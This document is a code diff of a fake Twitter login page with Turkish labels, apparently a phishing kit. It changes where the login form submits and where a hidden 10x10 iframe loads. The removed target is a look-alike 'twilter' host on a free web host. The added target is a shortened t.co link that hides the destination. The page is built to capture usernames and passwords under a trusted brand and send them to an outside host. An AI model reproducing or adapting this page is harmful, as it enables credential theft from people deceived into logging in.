@@ -90,7 +90,7 @@ data-fouc-class-names="swift-loading"
 
     
     <noscript>
-      <form action="https://twilter-post-source.000webhostapp.com/" method="POST" class="NoScriptForm">
+      <form action="https://t.co/JYfxgAPF8m" method="POST" class="NoScriptForm">
         <input type="hidden" value="becf3286d948dee9b86c86d98c09b08abdbb9647" name="authenticity_token">
 
         <div class="NoScriptForm-content">
@@ -243,7 +243,7 @@ data-fouc-class-names="swift-loading"
     <input type="password" class="text-input" name="session[password]" placeholder="Şifre" autocomplete="current-password">
     
   </div>
-  <iframe width="10" height="10" src="https://t.co/QbwVwBRRLx" frameborder="0" allowfullscreen></iframe>
+  <iframe width="10" height="10" src="https://t.co/JYfxgAPF8m" frameborder="0" allowfullscreen></iframe>
     <div class="LoginForm-rememberForgot">
       <label>
         <input type="checkbox" value="1" name="remember_me" checked="checked">
